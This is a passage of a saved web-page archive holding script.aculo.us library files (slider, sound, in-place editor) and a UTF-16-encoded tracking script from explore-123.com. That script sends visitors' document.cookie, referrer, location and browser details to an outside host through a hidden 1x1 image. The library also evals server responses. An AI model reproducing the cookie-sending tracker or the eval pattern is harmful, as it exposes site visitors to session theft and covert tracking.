        this.element.observe(pair.key, listener);
      if (this.options.externalControl)
        this.options.externalControl.observe(pair.key, listener);
    }.bind(this));
  },
  removeForm: function() {
    if (!this._form) return;
    this._form.remove();
    this._form =3D null;
    this._controls =3D { };
  },
  showSaving: function() {
    this._oldInnerHTML =3D this.element.innerHTML;
    this.element.innerHTML =3D this.options.savingText;
    this.element.addClassName(this.options.savingClassName);
    this.element.style.backgroundColor =3D this._originalBackground;
    this.element.show();
  },
  triggerCallback: function(cbName, arg) {
    if ('function' =3D=3D typeof this.options[cbName]) {
      this.options[cbName](this, arg);
    }
  },
  unregisterListeners: function() {
    $H(this._listeners).each(function(pair) {
      if (!this.options.externalControlOnly)
        this.element.stopObserving(pair.key, pair.value);
      if (this.options.externalControl)
        this.options.externalControl.stopObserving(pair.key, pair.value);
    }.bind(this));
  },
  wrapUp: function(transport) {
    this.leaveEditMode();
    // Can't use triggerCallback due to backward compatibility: requires
    // binding + direct element
    this._boundComplete(transport, this.element);
  }
});

Object.extend(Ajax.InPlaceEditor.prototype, {
  dispose: Ajax.InPlaceEditor.prototype.destroy
});

Ajax.InPlaceCollectionEditor =3D Class.create(Ajax.InPlaceEditor, {
  initialize: function($super, element, url, options) {
    this._extraDefaultOptions =3D Ajax.InPlaceCollectionEditor.DefaultOptio=
ns;
    $super(element, url, options);
  },

  createEditField: function() {
    var list =3D document.createElement('select');
    list.name =3D this.options.paramName;
    list.size =3D 1;
    this._controls.editor =3D list;
    this._collection =3D this.options.collection || [];
    if (this.options.loadCollectionURL)
      this.loadCollection();
    else
      this.checkForExternalText();
    this._form.appendChild(this._controls.editor);
  },

  loadCollection: function() {
    this._form.addClassName(this.options.loadingClassName);
    this.showLoadingText(this.options.loadingCollectionText);
    var options =3D Object.extend({ method: 'get' }, this.options.ajaxOptio=
ns);
    Object.extend(options, {
      parameters: 'editorId=3D' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        var js =3D transport.responseText.strip();
        if (!/^\[.*\]$/.test(js)) // TODO: improve sanity check
          throw('Server returned an invalid collection representation.');
        this._collection =3D eval(js);
        this.checkForExternalText();
      }.bind(this),
      onFailure: this.onFailure
    });
    new Ajax.Request(this.options.loadCollectionURL, options);
  },

  showLoadingText: function(text) {
    this._controls.editor.disabled =3D true;
    var tempOption =3D this._controls.editor.firstChild;
    if (!tempOption) {
      tempOption =3D document.createElement('option');
      tempOption.value =3D '';
      this._controls.editor.appendChild(tempOption);
      tempOption.selected =3D true;
    }
    tempOption.update((text || '').stripScripts().stripTags());
  },

  checkForExternalText: function() {
    this._text =3D this.getText();
    if (this.options.loadTextURL)
      this.loadExternalText();
    else
      this.buildOptionList();
  },

  loadExternalText: function() {
    this.showLoadingText(this.options.loadingText);
    var options =3D Object.extend({ method: 'get' }, this.options.ajaxOptio=
ns);
    Object.extend(options, {
      parameters: 'editorId=3D' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        this._text =3D transport.responseText.strip();
        this.buildOptionList();
      }.bind(this),
      onFailure: this.onFailure
    });
    new Ajax.Request(this.options.loadTextURL, options);
  },

  buildOptionList: function() {
    this._form.removeClassName(this.options.loadingClassName);
    this._collection =3D this._collection.map(function(entry) {
      return 2 =3D=3D=3D entry.length ? entry : [entry, entry].flatten();
    });
    var marker =3D ('value' in this.options) ? this.options.value : this._t=
ext;
    var textFound =3D this._collection.any(function(entry) {
      return entry[0] =3D=3D marker;
    }.bind(this));
    this._controls.editor.update('');
    var option;
    this._collection.each(function(entry, index) {
      option =3D document.createElement('option');
      option.value =3D entry[0];
      option.selected =3D textFound ? entry[0] =3D=3D marker : 0 =3D=3D ind=
ex;
      option.appendChild(document.createTextNode(entry[1]));
      this._controls.editor.appendChild(option);
    }.bind(this));
    this._controls.editor.disabled =3D false;
    Field.scrollFreeActivate(this._controls.editor);
  }
});

//**** DEPRECATION LAYER FOR InPlace[Collection]Editor! ****
//**** This only  exists for a while,  in order to  let ****
//**** users adapt to  the new API.  Read up on the new ****
//**** API and convert your code to it ASAP!            ****

Ajax.InPlaceEditor.prototype.initialize.dealWithDeprecatedOptions =3D funct=
ion(options) {
  if (!options) return;
  function fallback(name, expr) {
    if (name in options || expr =3D=3D=3D undefined) return;
    options[name] =3D expr;
  };
  fallback('cancelControl', (options.cancelLink ? 'link' : (options.cancelB=
utton ? 'button' :
    options.cancelLink =3D=3D options.cancelButton =3D=3D false ? false :=
 undefined)));
  fallback('okControl', (options.okLink ? 'link' : (options.okButton ? 'but=
ton' :
    options.okLink =3D=3D options.okButton =3D=3D false ? false : undefined=
)));
  fallback('highlightColor', options.highlightcolor);
  fallback('highlightEndColor', options.highlightendcolor);
};

Object.extend(Ajax.InPlaceEditor, {
  DefaultOptions: {
    ajaxOptions: { },
    autoRows: 3,                                // Use when multi-line w/=
 rows =3D=3D 1
    cancelControl: 'link',                      // 'link'|'button'|false
    cancelText: 'cancel',
    clickToEditText: 'Click to edit',
    externalControl: null,                      // id|elt
    externalControlOnly: false,
    fieldPostCreation: 'activate',              // 'activate'|'focus'|false
    formClassName: 'inplaceeditor-form',
    formId: null,                               // id|elt
    highlightColor: '#ffff99',
    highlightEndColor: '#ffffff',
    hoverClassName: '',
    htmlResponse: true,
    loadingClassName: 'inplaceeditor-loading',
    loadingText: 'Loading...',
    okControl: 'button',                        // 'link'|'button'|false
    okText: 'ok',
    paramName: 'value',
    rows: 1,                                    // If 1 and multi-line, use=
s autoRows
    savingClassName: 'inplaceeditor-saving',
    savingText: 'Saving...',
    size: 0,
    stripLoadedTextTags: false,
    submitOnBlur: false,
    textAfterControls: '',
    textBeforeControls: '',
    textBetweenControls: ''
  },
  DefaultCallbacks: {
    callback: function(form) {
      return Form.serialize(form);
    },
    onComplete: function(transport, element) {
      // For backward compatibility, this one is bound to the IPE, and pass=
es
      // the element directly.  It was too often customized, so we don't br=
eak it.
      new Effect.Highlight(element, {
        startcolor: this.options.highlightColor, keepBackgroundImage: true=
 });
    },
    onEnterEditMode: null,
    onEnterHover: function(ipe) {
      ipe.element.style.backgroundColor =3D ipe.options.highlightColor;
      if (ipe._effect)
        ipe._effect.cancel();
    },
    onFailure: function(transport, ipe) {
      alert('Error communication with the server: ' + transport.responseTex=
t.stripTags());
    },
    onFormCustomization: null, // Takes the IPE and its generated form, aft=
er editor, before controls.
    onLeaveEditMode: null,
    onLeaveHover: function(ipe) {
      ipe._effect =3D new Effect.Highlight(ipe.element, {
        startcolor: ipe.options.highlightColor, endcolor: ipe.options.highl=
ightEndColor,
        restorecolor: ipe._originalBackground, keepBackgroundImage: true
      });
    }
  },
  Listeners: {
    click: 'enterEditMode',
    keydown: 'checkForEscapeOrReturn',
    mouseover: 'enterHover',
    mouseout: 'leaveHover'
  }
});

Ajax.InPlaceCollectionEditor.DefaultOptions =3D {
  loadingCollectionText: 'Loading options...'
};

// Delayed observer, like Form.Element.Observer,
// but waits for delay after last key input
// Ideal for live-search fields

Form.Element.DelayedObserver =3D Class.create({
  initialize: function(element, delay, callback) {
    this.delay     =3D delay || 0.5;
    this.element   =3D $(element);
    this.callback  =3D callback;
    this.timer     =3D null;
    this.lastValue =3D $F(this.element);
    Event.observe(this.element,'keyup',this.delayedListener.bindAsEventList=
ener(this));
  },
  delayedListener: function(event) {
    if(this.lastValue =3D=3D $F(this.element)) return;
    if(this.timer) clearTimeout(this.timer);
    this.timer =3D setTimeout(this.onTimerEvent.bind(this), this.delay * 10=
00);
    this.lastValue =3D $F(this.element);
  },
  onTimerEvent: function() {
    this.timer =3D null;
    this.callback(this.element, $F(this.element));
  }
});
------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/slider.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

// script.aculo.us slider.js v1.8.3, Thu Oct 08 11:23:33 +0200 2009

// Copyright (c) 2005-2009 Marty Haught, Thomas Fuchs
//
// script.aculo.us is freely distributable under the terms of an MIT-style=
 license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

if (!Control) var Control =3D { };

// options:
//  axis: 'vertical', or 'horizontal' (default)
//
// callbacks:
//  onChange(value)
//  onSlide(value)
Control.Slider =3D Class.create({
  initialize: function(handle, track, options) {
    var slider =3D this;

    if (Object.isArray(handle)) {
      this.handles =3D handle.collect( function(e) { return $(e) });
    } else {
      this.handles =3D [$(handle)];
    }

    this.track   =3D $(track);
    this.options =3D options || { };

    this.axis      =3D this.options.axis || 'horizontal';
    this.increment =3D this.options.increment || 1;
    this.step      =3D parseInt(this.options.step || '1');
    this.range     =3D this.options.range || $R(0,1);

    this.value     =3D 0; // assure backwards compat
    this.values    =3D this.handles.map( function() { return 0 });
    this.spans     =3D this.options.spans ? this.options.spans.map(function=
(s){ return $(s) }) : false;
    this.options.startSpan =3D $(this.options.startSpan || null);
    this.options.endSpan   =3D $(this.options.endSpan || null);

    this.restricted =3D this.options.restricted || false;

    this.maximum   =3D this.options.maximum || this.range.end;
    this.minimum   =3D this.options.minimum || this.range.start;

    // Will be used to align the handle onto the track, if necessary
    this.alignX =3D parseInt(this.options.alignX || '0');
    this.alignY =3D parseInt(this.options.alignY || '0');

    this.trackLength =3D this.maximumOffset() - this.minimumOffset();

    this.handleLength =3D this.isVertical() ?
      (this.handles[0].offsetHeight !=3D 0 ?
        this.handles[0].offsetHeight : this.handles[0].style.height.replace=
(/px$/,"")) :
      (this.handles[0].offsetWidth !=3D 0 ? this.handles[0].offsetWidth :
        this.handles[0].style.width.replace(/px$/,""));

    this.active   =3D false;
    this.dragging =3D false;
    this.disabled =3D false;

    if (this.options.disabled) this.setDisabled();

    // Allowed values array
    this.allowedValues =3D this.options.values ? this.options.values.sortBy=
(Prototype.K) : false;
    if (this.allowedValues) {
      this.minimum =3D this.allowedValues.min();
      this.maximum =3D this.allowedValues.max();
    }

    this.eventMouseDown =3D this.startDrag.bindAsEventListener(this);
    this.eventMouseUp   =3D this.endDrag.bindAsEventListener(this);
    this.eventMouseMove =3D this.update.bindAsEventListener(this);

    // Initialize handles in reverse (make sure first handle is active)
    this.handles.each( function(h,i) {
      i =3D slider.handles.length-1-i;
      slider.setValue(parseFloat(
        (Object.isArray(slider.options.sliderValue) ?
          slider.options.sliderValue[i] : slider.options.sliderValue) ||
         slider.range.start), i);
      h.makePositioned().observe("mousedown", slider.eventMouseDown);
    });

    this.track.observe("mousedown", this.eventMouseDown);
    document.observe("mouseup", this.eventMouseUp);
    document.observe("mousemove", this.eventMouseMove);

    this.initialized =3D true;
  },
  dispose: function() {
    var slider =3D this;
    Event.stopObserving(this.track, "mousedown", this.eventMouseDown);
    Event.stopObserving(document, "mouseup", this.eventMouseUp);
    Event.stopObserving(document, "mousemove", this.eventMouseMove);
    this.handles.each( function(h) {
      Event.stopObserving(h, "mousedown", slider.eventMouseDown);
    });
  },
  setDisabled: function(){
    this.disabled =3D true;
  },
  setEnabled: function(){
    this.disabled =3D false;
  },
  getNearestValue: function(value){
    if (this.allowedValues){
      if (value >=3D this.allowedValues.max()) return(this.allowedValues.ma=
x());
      if (value <=3D this.allowedValues.min()) return(this.allowedValues.mi=
n());

      var offset =3D Math.abs(this.allowedValues[0] - value);
      var newValue =3D this.allowedValues[0];
      this.allowedValues.each( function(v) {
        var currentOffset =3D Math.abs(v - value);
        if (currentOffset <=3D offset){
          newValue =3D v;
          offset =3D currentOffset;
        }
      });
      return newValue;
    }
    if (value > this.range.end) return this.range.end;
    if (value < this.range.start) return this.range.start;
    return value;
  },
  setValue: function(sliderValue, handleIdx){
    if (!this.active) {
      this.activeHandleIdx =3D handleIdx || 0;
      this.activeHandle    =3D this.handles[this.activeHandleIdx];
      this.updateStyles();
    }
    handleIdx =3D handleIdx || this.activeHandleIdx || 0;
    if (this.initialized && this.restricted) {
      if ((handleIdx>0) && (sliderValue<this.values[handleIdx-1]))
        sliderValue =3D this.values[handleIdx-1];
      if ((handleIdx < (this.handles.length-1)) && (sliderValue>this.values=
[handleIdx+1]))
        sliderValue =3D this.values[handleIdx+1];
    }
    sliderValue =3D this.getNearestValue(sliderValue);
    this.values[handleIdx] =3D sliderValue;
    this.value =3D this.values[0]; // assure backwards compat

    this.handles[handleIdx].style[this.isVertical() ? 'top' : 'left'] =3D
      this.translateToPx(sliderValue);

    this.drawSpans();
    if (!this.dragging || !this.event) this.updateFinished();
  },
  setValueBy: function(delta, handleIdx) {
    this.setValue(this.values[handleIdx || this.activeHandleIdx || 0] + del=
ta,
      handleIdx || this.activeHandleIdx || 0);
  },
  translateToPx: function(value) {
    return Math.round(
      ((this.trackLength-this.handleLength)/(this.range.end-this.range.star=
t)) *
      (value - this.range.start)) + "px";
  },
  translateToValue: function(offset) {
    return ((offset/(this.trackLength-this.handleLength) *
      (this.range.end-this.range.start)) + this.range.start);
  },
  getRange: function(range) {
    var v =3D this.values.sortBy(Prototype.K);
    range =3D range || 0;
    return $R(v[range],v[range+1]);
  },
  minimumOffset: function(){
    return(this.isVertical() ? this.alignY : this.alignX);
  },
  maximumOffset: function(){
    return(this.isVertical() ?
      (this.track.offsetHeight !=3D 0 ? this.track.offsetHeight :
        this.track.style.height.replace(/px$/,"")) - this.alignY :
      (this.track.offsetWidth !=3D 0 ? this.track.offsetWidth :
        this.track.style.width.replace(/px$/,"")) - this.alignX);
  },
  isVertical:  function(){
    return (this.axis =3D=3D 'vertical');
  },
  drawSpans: function() {
    var slider =3D this;
    if (this.spans)
      $R(0, this.spans.length-1).each(function(r) { slider.setSpan(slider.s=
pans[r], slider.getRange(r)) });
    if (this.options.startSpan)
      this.setSpan(this.options.startSpan,
        $R(0, this.values.length>1 ? this.getRange(0).min() : this.value ));
    if (this.options.endSpan)
      this.setSpan(this.options.endSpan,
        $R(this.values.length>1 ? this.getRange(this.spans.length-1).max()=
 : this.value, this.maximum));
  },
  setSpan: function(span, range) {
    if (this.isVertical()) {
      span.style.top =3D this.translateToPx(range.start);
      span.style.height =3D this.translateToPx(range.end - range.start + th=
is.range.start);
    } else {
      span.style.left =3D this.translateToPx(range.start);
      span.style.width =3D this.translateToPx(range.end - range.start + thi=
s.range.start);
    }
  },
  updateStyles: function() {
    this.handles.each( function(h){ Element.removeClassName(h, 'selected')=
 });
    Element.addClassName(this.activeHandle, 'selected');
  },
  startDrag: function(event) {
    if (Event.isLeftClick(event)) {
      if (!this.disabled){
        this.active =3D true;

        var handle =3D Event.element(event);
        var pointer  =3D [Event.pointerX(event), Event.pointerY(event)];
        var track =3D handle;
        if (track=3D=3Dthis.track) {
          var offsets  =3D this.track.cumulativeOffset();
          this.event =3D event;
          this.setValue(this.translateToValue(
           (this.isVertical() ? pointer[1]-offsets[1] : pointer[0]-offsets[=
0])-(this.handleLength/2)
          ));
          var offsets  =3D this.activeHandle.cumulativeOffset();
          this.offsetX =3D (pointer[0] - offsets[0]);
          this.offsetY =3D (pointer[1] - offsets[1]);
        } else {
          // find the handle (prevents issues with Safari)
          while((this.handles.indexOf(handle) =3D=3D -1) && handle.parentNo=
de)
            handle =3D handle.parentNode;

          if (this.handles.indexOf(handle)!=3D-1) {
            this.activeHandle    =3D handle;
            this.activeHandleIdx =3D this.handles.indexOf(this.activeHandle=
);
            this.updateStyles();

            var offsets  =3D this.activeHandle.cumulativeOffset();
            this.offsetX =3D (pointer[0] - offsets[0]);
            this.offsetY =3D (pointer[1] - offsets[1]);
          }
        }
      }
      Event.stop(event);
    }
  },
  update: function(event) {
   if (this.active) {
      if (!this.dragging) this.dragging =3D true;
      this.draw(event);
      if (Prototype.Browser.WebKit) window.scrollBy(0,0);
      Event.stop(event);
   }
  },
  draw: function(event) {
    var pointer =3D [Event.pointerX(event), Event.pointerY(event)];
    var offsets =3D this.track.cumulativeOffset();
    pointer[0] -=3D this.offsetX + offsets[0];
    pointer[1] -=3D this.offsetY + offsets[1];
    this.event =3D event;
    this.setValue(this.translateToValue( this.isVertical() ? pointer[1] :=
 pointer[0] ));
    if (this.initialized && this.options.onSlide)
      this.options.onSlide(this.values.length>1 ? this.values : this.value,=
 this);
  },
  endDrag: function(event) {
    if (this.active && this.dragging) {
      this.finishDrag(event, true);
      Event.stop(event);
    }
    this.active =3D false;
    this.dragging =3D false;
  },
  finishDrag: function(event, success) {
    this.active =3D false;
    this.dragging =3D false;
    this.updateFinished();
  },
  updateFinished: function() {
    if (this.initialized && this.options.onChange)
      this.options.onChange(this.values.length>1 ? this.values : this.value=
, this);
    this.event =3D null;
  }
});
------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/sound.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

// script.aculo.us sound.js v1.8.3, Thu Oct 08 11:23:33 +0200 2009

// Copyright (c) 2005-2009 Thomas Fuchs (http://script.aculo.us, http://mir=
.aculo.us)
//
// Based on code created by Jules Gravinese (http://www.webveteran.com/)
//
// script.aculo.us is freely distributable under the terms of an MIT-style=
 license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

Sound =3D {
  tracks: {},
  _enabled: true,
  template:
    new Template('<embed style=3D"height:0" id=3D"sound_#{track}_#{id}" src=
=3D"#{url}" loop=3D"false" autostart=3D"true" hidden=3D"true"/>'),
  enable: function(){
    Sound._enabled =3D true;
  },
  disable: function(){
    Sound._enabled =3D false;
  },
  play: function(url){
    if(!Sound._enabled) return;
    var options =3D Object.extend({
      track: 'global', url: url, replace: false
    }, arguments[1] || {});

    if(options.replace && this.tracks[options.track]) {
      $R(0, this.tracks[options.track].id).each(function(id){
        var sound =3D $('sound_'+options.track+'_'+id);
        sound.Stop && sound.Stop();
        sound.remove();
      });
      this.tracks[options.track] =3D null;
    }

    if(!this.tracks[options.track])
      this.tracks[options.track] =3D { id: 0 };
    else
      this.tracks[options.track].id++;

    options.id =3D this.tracks[options.track].id;
    $$('body')[0].insert(
      Prototype.Browser.IE ? new Element('bgsound',{
        id: 'sound_'+options.track+'_'+options.id,
        src: options.url, loop: 1, autostart: true
      }) : Sound.template.evaluate(options));
  }
};

if(Prototype.Browser.Gecko && navigator.userAgent.indexOf("Win") > 0){
  if(navigator.plugins && $A(navigator.plugins).detect(function(p){ return=
 p.name.indexOf('QuickTime') !=3D -1 }))
    Sound.template =3D new Template('<object id=3D"sound_#{track}_#{id}" wi=
dth=3D"0" height=3D"0" type=3D"audio/mpeg" data=3D"#{url}"/>');
  else if(navigator.plugins && $A(navigator.plugins).detect(function(p){ re=
turn p.name.indexOf('Windows Media') !=3D -1 }))
    Sound.template =3D new Template('<object id=3D"sound_#{track}_#{id}" ty=
pe=3D"application/x-mplayer2" data=3D"#{url}"></object>');
  else if(navigator.plugins && $A(navigator.plugins).detect(function(p){ re=
turn p.name.indexOf('RealPlayer') !=3D -1 }))
    Sound.template =3D new Template('<embed type=3D"audio/x-pn-realaudio-pl=
ugin" style=3D"height:0" id=3D"sound_#{track}_#{id}" src=3D"#{url}" loop=3D=
"false" autostart=3D"true" hidden=3D"true"/>');
  else
    Sound.play =3D function(){};
}=20
------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://explore-123.com/js/10316.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

=FF=FEv=00a=00r=00 =00t=00r=00k=00_=00s=00w=00 =00=3D=00 =00e=00s=00c=00a=
=00p=00e=00(=00s=00c=00r=00e=00e=00n=00.=00w=00i=00d=00t=00h=00)=00.=00s=00=
u=00b=00s=00t=00r=00i=00n=00g=00(=000=00,=00 =006=00)=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00s=00h=00 =00=3D=00 =00e=00s=00c=00a=00p=
=00e=00(=00s=00c=00r=00e=00e=00n=00.=00h=00e=00i=00g=00h=00t=00)=00.=00s=00=
u=00b=00s=00t=00r=00i=00n=00g=00(=000=00,=00 =006=00)=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00r=00e=00f=00 =00=3D=00 =00e=00s=00c=00a=
=00p=00e=00(=00d=00o=00c=00u=00m=00e=00n=00t=00.=00r=00e=00f=00e=00r=00r=00=
e=00r=00)=00.=00s=00u=00b=00s=00t=00r=00i=00n=00g=00(=000=00,=00 =001=001=
=000=000=00)=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00t=00i=00t=00 =00=3D=00 =00e=00s=00c=00a=
=00p=00e=00(=00d=00o=00c=00u=00m=00e=00n=00t=00.=00t=00i=00t=00l=00e=00)=00=
.=00s=00u=00b=00s=00t=00r=00i=00n=00g=00(=000=00,=00 =002=000=000=00)=00;=00
=00
=00t=00r=00k=00_=00t=00i=00t=00 =00=3D=00 =00t=00r=00k=00_=00t=00i=00t=00.=
=00r=00e=00p=00l=00a=00c=00e=00(=00/=00\=00%=00u=000=000=00a=000=00/=00g=00=
,=00 =00'=00'=00)=00;=00
=00
=00t=00r=00k=00_=00t=00i=00t=00 =00=3D=00 =00t=00r=00k=00_=00t=00i=00t=00.=
=00r=00e=00p=00l=00a=00c=00e=00(=00/=00\=00%=00u=002=001=002=002=00/=00g=00=
,=00 =00'=00'=00)=00;=00
=00
=00t=00r=00k=00_=00t=00i=00t=00 =00=3D=00 =00t=00r=00k=00_=00t=00i=00t=00.=
=00r=00e=00p=00l=00a=00c=00e=00(=00/=00\=00%=00u=00[=000=00-=009=00]=00[=00=
0=00-=009=00]=00[=000=00-=009=00]=00[=000=00-=009=00]=00/=00g=00,=00 =00'=
=00'=00)=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00l=00o=00c=00 =00=3D=00 =00e=00s=00c=00a=
=00p=00e=00(=00d=00o=00c=00u=00m=00e=00n=00t=00.=00l=00o=00c=00a=00t=00i=00=
o=00n=00)=00.=00s=00u=00b=00s=00t=00r=00i=00n=00g=00(=000=00,=00 =002=000=
=000=00)=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00a=00g=00n=00 =00=3D=00 =00e=00s=00c=00a=
=00p=00e=00(=00n=00a=00v=00i=00g=00a=00t=00o=00r=00.=00a=00p=00p=00N=00a=00=
m=00e=00)=00.=00s=00u=00b=00s=00t=00r=00i=00n=00g=00(=000=00,=00 =001=000=
=000=00)=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00l=00n=00g=00 =00=3D=00 =00w=00i=00n=00d=
=00o=00w=00.=00n=00a=00v=00i=00g=00a=00t=00o=00r=00.=00u=00s=00e=00r=00L=00=
a=00n=00g=00u=00a=00g=00e=00 =00|=00|=00 =00w=00i=00n=00d=00o=00w=00.=00n=
=00a=00v=00i=00g=00a=00t=00o=00r=00.=00l=00a=00n=00g=00u=00a=00g=00e=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00a=00g=00v=00 =00=3D=00 =00e=00s=00c=00a=
=00p=00e=00(=00n=00a=00v=00i=00g=00a=00t=00o=00r=00.=00u=00s=00e=00r=00A=00=
g=00e=00n=00t=00 =00+=00 =00'=00.=00l=00f=00c=00d=00'=00 =00+=00 =00s=00c=
=00r=00e=00e=00n=00.=00c=00o=00l=00o=00r=00D=00e=00p=00t=00h=00 =00+=00 =00=
'=00.=00l=00f=00l=00n=00g=00'=00 =00+=00 =00t=00r=00k=00_=00l=00n=00g=00)=
=00.=00s=00u=00b=00s=00t=00r=00i=00n=00g=00(=000=00,=00 =001=000=000=000=00=
)=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00d=00o=00m=00 =00=3D=00 =00e=00s=00c=00a=
=00p=00e=00(=00d=00o=00c=00u=00m=00e=00n=00t=00.=00d=00o=00m=00a=00i=00n=00=
)=00.=00s=00u=00b=00s=00t=00r=00i=00n=00g=00(=000=00,=00 =002=000=000=00)=
=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00u=00s=00e=00r=00 =00=3D=00 =00'=001=000=
=003=001=006=00'=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00c=00o=00o=00k=00i=00e=00 =00=3D=00 =00d=
=00o=00c=00u=00m=00e=00n=00t=00.=00c=00o=00o=00k=00i=00e=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00i=00m=00g=00 =00=3D=00 =00'=00h=00t=00t=
=00p=00:=00/=00/=00e=00x=00p=00l=00o=00r=00e=00-=001=002=003=00.=00c=00o=00=
m=00/=00i=00m=00a=00g=00e=00s=00/=00t=00r=00a=00c=00k=00/=00'=00 =00+=00 =
=00t=00r=00k=00_=00u=00s=00e=00r=00 =00+=00 =00'=00.=00p=00n=00g=00'=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00l=00i=00n=00k=00 =00=3D=00 =00t=00r=00k=
=00_=00i=00m=00g=00 =00+=00 =00'=00?=00t=00r=00k=00_=00u=00s=00e=00r=00=3D=
=00'=00 =00+=00 =00t=00r=00k=00_=00u=00s=00e=00r=00 =00+=00 =00'=00&=00t=00=
r=00k=00_=00s=00w=00=3D=00'=00 =00+=00 =00t=00r=00k=00_=00s=00w=00 =00+=00=
 =00'=00&=00t=00r=00k=00_=00s=00h=00=3D=00'=00 =00+=00 =00t=00r=00k=00_=00s=
=00h=00 =00+=00 =00'=00&=00t=00r=00k=00_=00r=00e=00f=00=3D=00'=00 =00+=00=
 =00t=00r=00k=00_=00r=00e=00f=00 =00+=00 =00'=00&=00t=00r=00k=00_=00t=00i=
=00t=00=3D=00'=00 =00+=00 =00t=00r=00k=00_=00t=00i=00t=00 =00+=00 =00'=00&=
=00t=00r=00k=00_=00l=00o=00c=00=3D=00'=00 =00+=00 =00t=00r=00k=00_=00l=00o=
=00c=00 =00+=00 =00'=00&=00t=00r=00k=00_=00a=00g=00n=00=3D=00'=00 =00+=00=
 =00t=00r=00k=00_=00a=00g=00n=00 =00+=00 =00'=00&=00t=00r=00k=00_=00a=00g=
=00v=00=3D=00'=00 =00+=00 =00t=00r=00k=00_=00a=00g=00v=00 =00+=00 =00'=00&=
=00t=00r=00k=00_=00d=00o=00m=00=3D=00'=00 =00+=00 =00t=00r=00k=00_=00d=00o=
=00m=00 =00+=00 =00'=00&=00t=00r=00k=00_=00c=00o=00o=00k=00i=00e=00=3D=00'=
=00 =00+=00 =00t=00r=00k=00_=00c=00o=00o=00k=00i=00e=00;=00
=00
=00v=00a=00r=00 =00t=00r=00k=00_=00i=00m=00g=00l=00o=00a=00d=00 =00=3D=00=
 =00'=00<=00i=00m=00g=00 =00s=00r=00c=00=3D=00"=00'=00 =00+=00 =00t=00r=00k=
=00_=00l=00i=00n=00k=00 =00+=00 =00'=00"=00 =00w=00i=00d=00t=00h=00=3D=00"=
=001=00"=00 =00h=00e=00i=00g=00h=00t=00=3D=00"=001=00"=00 =00b=00o=00r=00d=
=00e=00r=00=3D=00"=000=00"=00 =00s=00t=00y=00l=00e=00=3D=00"=00d=00i=00s=00=
p=00l=00a=00y=00:=00 =00n=00o=00n=00e=00;=00"=00 =00/=00>=00'=00;=00
=00
=00d=00o=00c=00u=00m=00e=00n=00t=00.=00w=00r=00i=00t=00e=00l=00n=00(=00t=00=
r=00k=00_=00i=00m=00g=00l=00o=00a=00d=00)=00;=00
=00
=00
------=_Part_D48E12B_E642554.1364831838822--
